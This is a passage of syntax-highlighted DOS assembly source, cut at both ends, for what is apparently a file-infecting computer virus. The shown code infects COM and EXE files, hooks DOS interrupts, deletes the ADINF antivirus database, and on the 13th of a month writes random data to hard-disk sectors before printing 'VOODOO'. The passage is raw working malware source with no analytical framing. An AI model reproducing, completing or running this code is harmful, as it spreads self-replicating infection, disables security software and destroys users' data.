             </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seekf_fpos</span><span class="sc0">
           </span><span class="sc1">;-------------------------------------------</span><span class="sc0">
              </span><span class="sc1">;es:[Hosesize]</span><span class="sc0">
              </span><span class="sc1">;BX=handel</span><span class="sc0">
              </span><span class="sc1">;CX=number of byte to read</span><span class="sc0">
              </span><span class="sc1">;DS:DX BUFFER</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetMySize</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">Hosesize</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">272</span><span class="sc0">
              </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">STUFF_SIZE</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">New_Bady</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">writef</span><span class="sc0">
              </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">nextP</span><span class="sc0">
          </span><span class="sc1">;---------------------------------------------</span><span class="sc0">
</span><span class="sc5">ComG_60K_J</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">ComG_60K</span><span class="sc0">
</span><span class="sc5">exe_file_2_J</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exe_file_2</span><span class="sc0">
          </span><span class="sc1">;--------------------------------------------</span><span class="sc0">
</span><span class="sc5">nextp</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">CALL_COM</span><span class="sc4">],</span><span class="sc2">0e8h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">filesize</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">CALL_COM</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
          </span><span class="sc1">;---------------------------------------------</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seekF0</span><span class="sc0">
              </span><span class="sc1">;BX=handel</span><span class="sc0">
              </span><span class="sc1">;CX=number of byte to read</span><span class="sc0">
              </span><span class="sc1">;DS:DX BUFFER</span><span class="sc0">
              </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc4">:[</span><span class="sc5">handleR</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">CALL_COM</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">writef</span><span class="sc0">
          </span><span class="sc1">;---------------------------------------------</span><span class="sc0">
    </span><span class="sc5">ComG_60K</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">ret_old_atrc</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make52s</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">closeFile</span><span class="sc0">
              </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">retern_old_atr</span><span class="sc0">
              </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
              </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">Es</span><span class="sc4">:[</span><span class="sc5">Find_files</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc6">Jl</span><span class="sc0"> </span><span class="sc5">NEXt_COM_j</span><span class="sc0">
              </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">COM_file_not_found</span><span class="sc0">
  </span><span class="sc5">NEXt_COM_j</span><span class="sc0">  </span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NEXt_COM</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">add_c</span><span class="sc0">
               </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
               </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
               </span><span class="sc6">ret</span><span class="sc0">
           </span><span class="sc1">;-----------------------------------------</span><span class="sc0">
</span><span class="sc5">exe_file_2</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">typeFile</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seekF0</span><span class="sc0">
             </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">read_heder</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Infeckt_exe</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make52s</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">closeFile</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">typeFile</span><span class="sc4">],</span><span class="sc2">033h</span><span class="sc0">
             </span><span class="sc6">jmp</span><span class="sc0">  </span><span class="sc5">ret_old_atrc</span><span class="sc0">
</span><span class="sc5">COM_file_not_found</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc1">;-------------------------------------------</span><span class="sc0">
</span><span class="sc5">START_</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">84h</span><span class="sc0">
                    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">addr21</span><span class="sc4">-</span><span class="sc5">add_c</span><span class="sc0">
                    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsw</span><span class="sc0">
                    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">TAG_COM_OR_EXE</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">@AlocMem</span><span class="sc0">
                    </span><span class="sc1">;----</span><span class="sc0">
                    </span><span class="sc1">;----</span><span class="sc0">
                    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
 </span><span class="sc5">@AlocMem</span><span class="sc4">:</span><span class="sc0">
                    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">48H</span><span class="sc0">
                    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">017FH</span><span class="sc0">
                    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21</span><span class="sc0">
                    </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">@Next01</span><span class="sc0">
                    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">49H</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
                    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21</span><span class="sc0">
                    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">48H</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
                    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0FFFFH</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
                    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21</span><span class="sc0">
                    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0180H</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
                    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">48H</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
                    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21</span><span class="sc0">
                    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">@AlocMem</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc1">;-----------------------------------------</span><span class="sc0">
   </span><span class="sc5">@Next01</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
                    </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
                    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
                    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0C7H</span><span class="sc4">,</span><span class="sc2">06H</span><span class="sc4">,</span><span class="sc2">01H</span><span class="sc4">,</span><span class="sc2">00H</span><span class="sc4">,</span><span class="sc2">08H</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">
                    </span><span class="sc6">POP</span><span class="sc0">  </span><span class="sc8">DS</span><span class="sc0">
                    </span><span class="sc6">INC</span><span class="sc0">  </span><span class="sc8">AX</span><span class="sc0">
                   </span><span class="sc1">;---------------</span><span class="sc0">
     </span><span class="sc5">Inst</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">;ES=NEW_SEG</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;                  addres24hTR</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">144</span><span class="sc0"> </span><span class="sc1">;ds:si=int24h</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">addres24hTR</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsw</span><span class="sc0">
                   </span><span class="sc1">;---- Set New24h</span><span class="sc0">
                   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">New24h</span><span class="sc4">-</span><span class="sc5">add_c</span><span class="sc0">
                   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
                   </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                   </span><span class="sc1">;--------------</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Killall -9 ADINF :-)</span><span class="sc0">
                   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DellAdinf</span><span class="sc0">
                   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'c:\adinf═c═.░░░'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">DellAdinf</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
                   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21</span><span class="sc0">
                   </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">NotEx</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">
                   </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
  </span><span class="sc5">NotEx</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------------</span><span class="sc0">
                   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">randomaze</span><span class="sc0">
</span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
                    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">47h</span><span class="sc0">
                    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">CurDirRoot</span><span class="sc0">
                    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                    </span><span class="sc1">;----</span><span class="sc0">
                    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GrateJobe</span><span class="sc0">
                    </span><span class="sc1">;---</span><span class="sc0">
                     </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">setCR</span><span class="sc0">
                      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc13">'\',0
</span><span class="sc0">               </span><span class="sc5">setCR</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">
                      </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                     </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GrateJobe</span><span class="sc0">
                    </span><span class="sc1">;---------</span><span class="sc0">
                    </span><span class="sc1">; ret old dir</span><span class="sc0">
                      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">CurDirRoot</span><span class="sc0">
                      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">
                      </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                    </span><span class="sc1">;---Death------</span><span class="sc0">
                      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ah</span><span class="sc0">
                      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">int21</span><span class="sc0">
                      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">
                      </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Not13</span><span class="sc0">
                      </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">42H</span><span class="sc0">
                      </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0"> </span><span class="sc1">;CYL</span><span class="sc0">
                      </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">42H</span><span class="sc0">
                      </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">63</span><span class="sc0">
                      </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0"> </span><span class="sc1">;SEC</span><span class="sc0">
                      </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">42H</span><span class="sc0">
                      </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">31</span><span class="sc0">
                      </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
                      </span><span class="sc6">IN</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">42H</span><span class="sc0">
                      </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">03H</span><span class="sc0">
                      </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">
                      </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">13H</span><span class="sc0">
                      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
                      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc12">'V'</span><span class="sc0">
                      </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc12">'O'</span><span class="sc0">
                      </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc12">'O'</span><span class="sc0">
                      </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc12">'D'</span><span class="sc0">
                      </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc12">'O'</span><span class="sc0">
                      </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc12">'O'</span><span class="sc0">
                      </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
               </span><span class="sc5">Not13</span><span class="sc4">:</span><span class="sc1">;--------------</span><span class="sc0">
                     </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">104h</span><span class="sc0">
                     </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@zad_j01</span><span class="sc0">
</span><span class="sc5">dosEXIT</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">retOldInt24h</span><span class="sc0">
                     </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">freeMem</span><span class="sc0">
                     </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">4C00H</span><span class="sc0">
                     </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">
                     </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dosEXIT</span><span class="sc0">
</span><span class="sc5">retOldInt24h</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">addres24hTR</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">addres24hTR</span><span class="sc4">]</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
             </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@zad_j01</span><span class="sc0"> </span><span class="sc4">:</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@zad</span><span class="sc0">
</span><span class="sc5">int21</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@nnn</span><span class="sc0">
</span><span class="sc5">ADDR21</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">@nnn</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
         </span><span class="sc6">pushf</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">freeMem</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc0">
          </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;--------------------------------------------------</span><span class="sc0">
</span><span class="sc5">New24h</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
       </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc5">CS_old_bx</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;-------------------------</span><span class="sc0">
</span><span class="sc5">@zad</span><span class="sc4">:</span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">GoOut</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">retOldInt24h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">freeMem</span><span class="sc0">
</span><span class="sc5">FULLexit</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">TAG_COM_OR_EXE</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">_ne_com</span><span class="sc0">
                   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
     </span><span class="sc5">_ne_com</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">CS_old_bx</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">TAG_COM_OR_EXE</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">RETENER</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">CS_old_bx</span><span class="sc4">+</span><span class="sc5">z</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">07</span><span class="sc4">],</span><span class="sc2">0010h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
